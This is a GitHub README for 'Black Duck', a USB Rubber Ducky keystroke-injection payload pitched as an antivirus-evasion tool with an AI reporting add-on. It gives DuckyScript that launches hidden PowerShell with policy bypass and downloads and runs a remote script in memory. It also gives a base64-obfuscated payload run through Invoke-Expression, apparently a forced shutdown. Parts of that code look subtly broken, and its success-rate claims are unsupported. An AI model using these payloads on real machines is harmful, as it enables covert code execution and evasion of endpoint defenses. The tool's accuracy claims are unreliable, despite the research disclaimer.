![image](https://github.com/user-attachments/assets/a844f4b3-a0fa-490a-8eef-f98b724939f2)


Black Duck is an advanced USB Rubber Ducky-based payload designed to simulate undetected threat scenarios on Windows systems, enabling the assessment of endpoint security defenses. 
Using PowerShell obfuscation techniques, Black Duck effectively bypasses antivirus detection with an 85% success rate. 
This project integrates Gen AI 4.0 to automate vulnerability reporting, streamlining incident response processes and enhancing endpoint security resilience.


Key Features
Antivirus Evasion: Employs advanced PowerShell obfuscation tactics to bypass antivirus systems, exposing critical endpoint security gaps.
Automated Vulnerability Reporting: Integrates Gen AI 4.0 for real-time vulnerability analysis, reducing manual analysis time by 75%.
Enhanced Response Time: Automates severity rating and remediation suggestions, leading to a 70% improvement in response times and risk mitigation.
User-Friendly Interaction: Supports streamlined payload execution for controlled security testing environments.

Getting Started
To begin with Black Duck:

Install DuckyScript on your USB Rubber Ducky: Ensure your USB Rubber Ducky device is configured to execute DuckyScript payloads.
Prepare a Controlled Testing Environment: Use a virtual machine or isolated network setup to safely analyze payload behavior.
Download and Configure the Payload: Customize the payload to point to a local or secure testing server.
Installation
Clone the Repository:

bash
Copy code
git clone https://github.com/kuranikaran/Black-Duck.git
Prepare USB Rubber Ducky:

Flash the payload onto your USB Rubber Ducky device.
Make sure you have the necessary driver and encoding software installed.
Test Environment Setup:

Configure a Windows virtual machine for isolated testing.
Disable auto-update features on antivirus software for controlled evasion testing.
Usage
DuckyScript for Black Duck Payload
Use this DuckyScript to execute the obfuscated PowerShell command:

DELAY 500
REM Open Run Prompt
GUI r
DELAY 300
REM Open PowerShell in hidden window
STRING powershell -w hidden -nop -ep bypass -c "IEX ((New-Object System.Net.WebClient).DownloadString('https://github.com/kuranikaran/blackduck/blob/main/DuckyPayload.ps1'))"
ENTER

Remote Payload (payload.ps1)
Place the obfuscated PowerShell payload on your testing server or in a secure location.

powershell
$a=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('cwBoAHUAdABkAG8AdwBuACAALwBzACAALwBmACAALwB0ACAAMAA=='))
Invoke-Expression $a

Obfuscation Techniques
Black Duck employs:

Base64 encoding
String manipulation for command hiding
In-memory execution to evade detection
Legal Disclaimer
This tool is intended solely for research and educational purposes. Unauthorized use on systems without permission is illegal and punishable by law. Use Black Duck responsibly and only in controlled, authorized environments.

